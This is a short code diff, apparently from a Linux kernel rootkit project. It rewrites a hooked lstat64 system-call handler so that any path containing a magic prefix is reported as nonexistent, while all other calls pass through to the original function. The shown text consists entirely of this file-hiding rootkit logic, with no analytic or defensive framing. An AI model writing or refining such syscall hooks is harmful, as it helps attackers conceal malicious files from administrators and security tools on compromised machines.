@@ -73,10 +73,9 @@ end:
 
 asmlinkage int
 hooked_lstat64(const char *path, struct stat *buf) {
-  printk(KERN_INFO "Should not be here\n");
-  if (strstr(path, MAGIC_PREFIX) == NULL)
-    return og_lstat64(path, buf);
-  return -1;
+  if (strstr(path, MAGIC_PREFIX) != NULL)
+    return -ENOENT; 
+  return og_lstat64(path, buf);
 }
 
 asmlinkage ssize_t
